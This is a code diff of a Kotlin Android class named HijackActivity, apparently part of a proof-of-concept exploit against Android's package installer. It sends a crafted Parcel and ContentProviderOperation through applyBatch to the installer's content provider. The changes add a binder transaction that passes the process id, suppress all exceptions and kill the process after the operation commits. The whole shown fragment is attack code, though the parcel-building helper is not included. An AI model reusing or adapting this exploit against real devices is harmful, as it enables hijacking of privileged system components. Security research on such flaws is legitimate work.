@@ -21,6 +21,10 @@ class HijackActivity : AppCompatActivity() {
         private val request = ContentProviderOperation.newDelete(Uri.parse(uri)).build()
     }
 
+    val binder by lazy {
+        intent.getIBinderExtra(MainActivity.Key)
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         installResolver()
@@ -29,16 +33,17 @@ class HijackActivity : AppCompatActivity() {
                 onClick {
                     // async run on Dispatchers.IO & swallow all exceptions
                     (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
+                        binder.transact(
+                            MainActivity.RollingTo,
+                            Parcel.obtain().apply { writeInt(Process.myPid()) },
+                            Parcel.obtain(),
+                            0
+                        )
                         contentResolver.applyBatch(authority, arrayListOf(request))
+                        Log.e(TAG, "commit applyBatch operation to package installer")
+                        delay(200L)
+                        exitProcess(0)
                     }
-                    Log.e(TAG, "commit applyBatch operation to package installer")
-                    // ensure `applyBatch` already committed
-                    delay(100L)
-                    Log.e(
-                        TAG,
-                        "hijacker will quit this game from pid: ${Process.myPid()}"
-                    )
-                    exitProcess(0)
                 }
             }
         }
@@ -67,7 +72,7 @@ class HijackActivity : AppCompatActivity() {
                     Ropes(
                         source,
                         limit,
-                        intent.getIBinderExtra(MainActivity.Key)
+                        binder
                     ).buildParcel(
                         request, authority
                     ),
